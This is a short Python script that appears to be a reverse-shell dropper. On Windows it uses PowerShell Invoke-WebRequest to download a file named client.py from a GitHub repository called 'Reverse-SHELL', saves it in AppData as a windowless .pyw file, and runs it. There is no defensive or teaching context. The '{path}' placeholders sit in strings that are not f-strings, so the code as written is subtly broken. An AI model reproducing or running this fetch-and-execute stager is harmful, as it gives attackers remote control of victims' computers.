import os, sys, subprocess

username = os.environ.get('USERNAME')
path = os.environ['appdata'] + '\\client.pyw'

################################################ setup #################################################################
def setup():
  if not os.path.exists(path):
    subprocess.call(
      'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
      shell=True)
  subprocess.call('powershell.exe {path}')
################################################ done ##################################################################
# Running code ...
if __name__ == '__main__':
  setup()
